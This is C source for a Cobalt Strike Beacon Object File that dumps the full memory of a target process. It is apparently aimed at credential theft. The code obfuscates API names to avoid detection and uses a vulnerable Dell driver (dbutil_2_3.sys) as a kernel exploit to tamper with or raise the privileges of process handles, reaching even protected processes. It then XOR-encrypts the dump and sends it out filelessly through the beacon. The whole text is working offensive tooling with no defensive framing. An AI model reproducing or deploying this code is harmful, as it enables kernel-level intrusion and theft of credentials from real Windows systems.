				pMiniDumpParm->pDumpedBuffer = pNewBuffer;
				pMiniDumpParm->dwAllocatedBufferSize = dwNewBufferSize;
			}
			CallbackOutput->Status = S_OK;
			pDestination = (LPVOID)((DWORD_PTR)pMiniDumpParm->pDumpedBuffer + dwOffset);
			pMiniDumpParm->dwDumpedBufferSize = max(pMiniDumpParm->dwDumpedBufferSize, dwRequired);

			NTDLL$RtlCopyMemory(pDestination, CallbackInput->Io.Buffer, dwBufferBytes);
			break;
		}
		case IoFinishCallback:
		{
			CallbackOutput->Status = S_OK;
			break;
		}
		default:
		{
			return TRUE;
		}
	}
	return TRUE;
}

// Dump process memory
BOOL DumpProcessMemory(HANDLE dumpProcess, OUT LPVOID* dumpPtrRef, OUT SIZE_T* dumpSizePtr) {
	DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
	DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE,DWORD,SIZE_T);
	DECLSPEC_IMPORT HMODULE KERNEL32$LoadLibraryA(LPCSTR);
	DECLSPEC_IMPORT FARPROC KERNEL32$GetProcAddress(HMODULE,LPCSTR);
	DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE,DWORD,LPVOID);

	// Load dbghelp.dll to find MiniDumpWriteDump function pointer
	char dbghlp[] = { 'D','b','g','h','e','l','p','.','d','l','l',0 };
	char minidump[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p',0 };

	HMODULE psapiDll = KERNEL32$LoadLibraryA(dbghlp);
	_MiniDumpWriteDump pMiniDumpWriteDump = (_MiniDumpWriteDump)KERNEL32$GetProcAddress(psapiDll, minidump);
	if (!pMiniDumpWriteDump) {
		return FALSE;
	}

	MINIDUMP_CALLBACK_INFORMATION	MiniDumpInfo = { 0 };
	MINIDUMP_CALLBACK_PARM			MiniDumpParm = { 0 };

	// Exit if any input arguments are NULL
	if (!dumpProcess || !dumpPtrRef || !dumpSizePtr) {
		return FALSE;
	}

	MiniDumpParm.dwDumpedBufferSize = 0x00;
	MiniDumpParm.dwAllocatedBufferSize = INITIAL_BUFFER_SIZE;
	MiniDumpParm.pDumpedBuffer = (LPVOID)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, INITIAL_BUFFER_SIZE);

	// Check that buffer to hold dump allocated correctly
	if (!MiniDumpParm.pDumpedBuffer) {
		goto _END_OF_FUNC;
	}

	// Set callback routine to write dump into memory instead of to a file
	MiniDumpInfo.CallbackRoutine = (MINIDUMP_CALLBACK_ROUTINE)MinidumpCallbackRoutine;
	MiniDumpInfo.CallbackParam = &MiniDumpParm;

	// Create memory dump for target process handle
	if (!pMiniDumpWriteDump(dumpProcess, 0x00, INVALID_HANDLE_VALUE, MiniDumpWithFullMemory, NULL, NULL, &MiniDumpInfo)) {
		goto _END_OF_FUNC;
	}
	*dumpPtrRef = MiniDumpParm.pDumpedBuffer;
	*dumpSizePtr = MiniDumpParm.dwDumpedBufferSize;

	// Cleanup
_END_OF_FUNC:
	if (MiniDumpParm.pDumpedBuffer && !*dumpPtrRef)
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0x00, MiniDumpParm.pDumpedBuffer);
	return (*dumpPtrRef && *dumpSizePtr) ? TRUE : FALSE;
}



//////////////////////////
// Execution entrypoint //
////////////////////////// 

void go(char* args, int len) {

    DECLSPEC_IMPORT DWORD KERNEL32$GetCurrentProcessId(); 
    DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(DWORD,BOOL,DWORD);
    DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE);
    DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
    DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE,DWORD,LPVOID);


	////////////////////////////
	// INITIALIZING VARIABLES //
	////////////////////////////

	curProcId = KERNEL32$GetCurrentProcessId();
	BOOL dumpSuccess = FALSE;		// Track if dump succeeded since this BOF cleans up the kernel before downloading it
	HANDLE dumpProcHnd = NULL;      // Target handle to dump
	LPVOID memdumpPtr = NULL;        // Pointer to minidump
	SIZE_T memdumpSize = 0x00;      // Size of minidump
	DWORD processPrivMask = 0x0;    // Privileges to open handle to process with
	DWORD decoyPid  = 0;			// PID from sacrificial process (optional, if set then will perform kernel exploit)
	DWORD targetPid = 0;			// PID for target process to memory dump
	ULONGLONG origDecoyContents = 0;// Original contents at the decoy handle's kernel address
	int elevate = FALSE;            // If enabled, open process handle with low privileges and escalate it in kernel
	char filelessName[] = { 'h','n','d','o','u','t',0 }; // Name for 'fileless' downloaded through beacon (can be changed)


	//////////////////////////////////
	// Parse input data from beacon //
	//////////////////////////////////

	datap parser;
	BeaconDataParse(&parser, args, len);

	// Extract input arguments
	targetPid = BeaconDataInt(&parser);
	elevate = BeaconDataInt(&parser);
	decoyPid = BeaconDataInt(&parser);

	// Check for filename input, if none provided then perform fileless minidump and transfer through beacon
	char* dumpFileName = BeaconDataExtract(&parser, NULL);

	// Skip to end if no valid target PID supplied
	if (targetPid == 0) {
		goto _NO_ARGS;
	}
	// Set mask for handle based on 'elevate'
	if (elevate) {
		// Open limited privilege handle if 'elevate' is set (Can even get handles to PPL processes with this privilege mask)
		processPrivMask = PROCESS_QUERY_LIMITED_INFORMATION;
	}
	else {
		// Otherwise will open handle with enough privileges to minidump the target process
		processPrivMask = (PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION);
	}


	///////////////////////////////////////////////////////////
	// Open normal process handle OR resolve kernel offsets  //
	///////////////////////////////////////////////////////////
	
	// If not doing any kernel handle manipulations
	if (decoyPid == 0 && !elevate) {
		BeaconPrintf(CALLBACK_OUTPUT,"[*] Opening handle for standard dump to %d", targetPid);
		dumpProcHnd = KERNEL32$OpenProcess(processPrivMask, FALSE, targetPid);
		if (dumpProcHnd == NULL || dumpProcHnd == INVALID_HANDLE_VALUE) {
			BeaconPrintf(CALLBACK_ERROR,"Failed to open process %d directly", targetPid);
		}
		goto _MINIDUMP; // Go straight to minidump code after opening normal handle
	}

	// If doing kernel manipulations, resolve offsets for this windows build
	resolveVersionOffsets();


	//////////////////////////////////////////////////////
	// INIT KERNEL EXPLOIT HERE TO BUILD R/W PRIMITIVES //
	//////////////////////////////////////////////////////
	
	// Obtain a handle to the vulnerable driver //
	hDellDriver = GetVulnDriverHnd();
	if (!hDellDriver || (hDellDriver == INVALID_HANDLE_VALUE)) { 
		goto _CLEANUP; 
	}

	// Tamper with handle to sacrificial process 
	if (decoyPid != 0) {
		// Open a handle and ensure it is valid (stored in the kernel handle table)
		BeaconPrintf(CALLBACK_OUTPUT,"[*] Opening handle to decoy PID %d", decoyPid);
		dumpProcHnd = OpenHandle(decoyPid, processPrivMask);
		if (!dumpProcHnd) {
			BeaconPrintf(CALLBACK_ERROR,"Failed to open handle");
			goto _CLEANUP;
		}

		// Replace the EPROCESS object the handle points to
		origDecoyContents = TamperHandleDecoy(decoyPid, targetPid, handleKernelAddr, handleContents);
		if (!origDecoyContents) {
			BeaconPrintf(CALLBACK_ERROR,"Failed to tamper with handle, exiting");
			goto _CLEANUP;
		}
	}

	// Elevate handle privileges 
	if (elevate) {
		// If no prior handle, open a new one for targetPid directly
		if (dumpProcHnd == 0) {
			BeaconPrintf(CALLBACK_OUTPUT,"[*] Opening handle for elevation to %d", targetPid);
			dumpProcHnd = OpenHandle(targetPid, processPrivMask);
		}
		if (!dumpProcHnd) {
			BeaconPrintf(CALLBACK_ERROR,"Failed to open handle");
			goto _CLEANUP;
		}
		
		// Change token access mask to grant full access to it 
		if (!elevateHandle(handleKernelAddr)) {
			BeaconPrintf(CALLBACK_ERROR,"Failed to elevate handle privileges, exiting");
			goto _CLEANUP;
		}
	}


	///////////////////////////////////////////
	// Dump process memory for target handle //
	///////////////////////////////////////////
_MINIDUMP:
	// Dump process memory
	dumpSuccess = DumpProcessMemory(dumpProcHnd, &memdumpPtr, &memdumpSize);
	if (dumpSuccess) {
		// Encrypt memory dump
		int i = 0;
		while (i < memdumpSize) {
			// Use 4-byte key to encrypt minidump
			for (int j = 0; j < bXorKeySize; j++) {
				((PBYTE)memdumpPtr)[i] = (byte)((((PBYTE)memdumpPtr)[i] ^ (byte)bXorKey[j]) & 0xff);
				i++;

				// Set j to key length to exit loop if we are at end of minidump
				if (i >= memdumpSize) {
					j = bXorKeySize;
				}
			}
		}
	}
	else {
		BeaconPrintf(CALLBACK_ERROR,"Failed To dump process memory");
	}


	///////////////////////////////////////////////////////
	// RESTORE HANDLE POINTERS AND ANY DATA FROM EXPLOIT //
	///////////////////////////////////////////////////////

	if (decoyPid != 0 || elevate) {
		// Restore original handle value if a decoy handle was used; this avoids instability related to invalid reference counts
		if (decoyPid != 0) {
			writeqword(hDellDriver, handleKernelAddr, origDecoyContents);
		}

		// CLEAN UP KERNEL EXPLOIT (ONLY if you used elevate or decoy handle options) //
		//N/A for Dell dbutil_2_3.sys exploit
	}


	////////////////////////////////////////////////////////////
	// Transfer encrypted minidump buffer back through beacon //
	////////////////////////////////////////////////////////////

	// Transfer minidump buffer through beacon
	if (dumpSuccess) {
		// Download file through beacon without writing to disk
		if(dumpFileName[0] == 0) {
			BeaconPrintf(CALLBACK_OUTPUT,"[+] Downloading 0x%lx bytes from PID %d minidump", memdumpSize, targetPid);
			bcnDownloadFile(filelessName, (PCHAR)memdumpPtr, memdumpSize);
		}
		// Download the dump file to disk 
		else {
			BeaconPrintf(CALLBACK_OUTPUT,"[+] Writing 0x%lx bytes from PID %d minidump to file: %s", memdumpSize, targetPid, dumpFileName);
			WriteFileToDiskA(dumpFileName, (PBYTE)memdumpPtr, memdumpSize);
		}
	}

	// Final cleanup and exit //
_CLEANUP:
	if (dumpProcHnd) {
		KERNEL32$CloseHandle(dumpProcHnd);
	}
	if (hDellDriver) {
		KERNEL32$CloseHandle(hDellDriver);
	}
	if (memdumpPtr) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0x00, memdumpPtr);
	}
	return;

_NO_ARGS:
	BeaconPrintf(CALLBACK_OUTPUT,"[*] No target dump process argument provided, getting build number");
	if (!resolveVersionOffsets()) {
		BeaconPrintf(CALLBACK_OUTPUT,"[!] Did not find exact Windows build number in offset list. It is HIGHLY RECOMMENDED to add to this list before using a decoy handle");
	}
	return;

}


